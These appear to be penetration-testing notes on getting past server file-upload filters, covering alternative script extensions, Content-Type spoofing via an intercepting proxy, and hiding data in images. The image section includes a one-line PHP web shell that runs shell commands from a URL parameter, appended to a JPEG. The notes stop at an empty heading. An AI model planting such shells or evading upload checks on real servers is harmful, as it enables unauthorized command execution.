# File Types
In some cases servers may block some, but not all file extensions.

| Language | Extensions |
|----------|------------|
| php      | phtml php php3 php4 php5 inc |
| asp      | asp aspx |
| perl     | pi pm cgi lib |
| jsp      | jsp jspx jsw jsv jspf |
| coldfusion | cfw cfml cfc dbm |

# MIME Types
Servers will check to see if a file has the right MIME Type. Using an intercepting proxy we can change our request in transit using the `Content-Type` header field.

# Steganography
The practice of concealing information wihtin another message or physical object in order to avoid detection.

## Hiding code in images
These techniques may be useful, but they are also very easy to detect. Altering the image file will change it's file hash as well as inflate it's size.

Appending a string to the end of an image file will allow it to still be render, but also provide a unique attack vector.
```sh
echo '<?php echo shell_exec($_GET["cmd"]);?>' >> image.jpg
```
Using the same method you can attach an entire file to the image. That can later be extracted.
```sh
cat rar.rar >> image.jpg
```

Read the file
```sh
hexdump image.jpg | tail -10 | xxd -r -p
```

## Least Significant Bit (LSB) Manipulation
